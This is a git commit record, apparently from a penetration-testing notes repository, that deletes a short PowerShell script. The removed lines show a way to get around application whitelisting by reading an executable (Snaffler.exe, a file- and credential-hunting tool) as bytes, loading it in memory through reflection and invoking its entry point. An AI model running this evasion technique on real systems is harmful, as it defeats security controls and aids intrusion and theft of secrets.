6dc6fe201d7725ea8adb79ecd4e33160c9d3d225
ville87 <38942588+ville87@users.noreply.github.com>
2022-08-02 08:52:10 +0300

    Delete bypass_app_restrictions.ps1

--- Windows/bypass_app_restrictions.ps1
+++
@@ -1,8 +0,0 @@
-# This technique can in some cases be used to bypass application whitelisting
-# The following example runs the tool Snaffler.exe with the argument -s
-[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe
-$asm = [System.Reflection.Assembly]::Load($bytes)
-$vars = New-Object System.Collections.Generic.List[System.Object]
-$vars.Add("-s")
-$passed = [string[]]$vars.ToArray()
-$asm.EntryPoint.Invoke($null, @(,$passed))
